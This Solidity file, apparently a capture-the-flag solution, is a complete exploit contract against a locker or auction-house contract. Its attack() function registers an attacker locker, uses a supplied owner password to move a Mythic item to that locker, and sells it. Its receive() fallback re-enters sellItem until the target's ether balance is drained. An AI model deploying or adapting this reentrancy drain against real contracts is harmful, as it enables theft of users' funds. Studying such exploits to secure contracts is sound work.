// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

enum Rarity {
    Common,
    Rare,
    Epic,
    Mythic
}

interface ILockers{
    function getLocker(string calldata username, string calldata password) external;
    function transferItem(string calldata name, string calldata to, string calldata password) external;
    function sellItem(string calldata name, string calldata password) external;
    function putItem(string calldata name, string calldata owner, uint8 rarity) external;
    function retrieveItem(string calldata name, string calldata password) external;
}

contract Exploit {
    ILockers public target;
    constructor(address auctionHouse) {
        target = ILockers(auctionHouse);
    }

    // Attack Path:   
    // 1) getLocker("attacker", "testPassword")      - from current contract
    // 2) transferItem(username, attacker, password) - transfer mythic to us
    // 3) sellItem(mythicName, password)

    function attack(string memory mythic_name, string memory attacker_username, string memory attacker_password, string memory mythic_owner_password) external payable{
        target.getLocker(attacker_username, attacker_password);
        target.transferItem(mythic_name, attacker_username, mythic_owner_password);
        target.sellItem(mythic_name, attacker_password);
    }
    receive() external payable{
        if(address(target).balance > 0){
            string memory mythicName = "WizardsScepter";
            string memory atPass = "testPassword";
            target.sellItem(mythicName, atPass);
        }
    }
}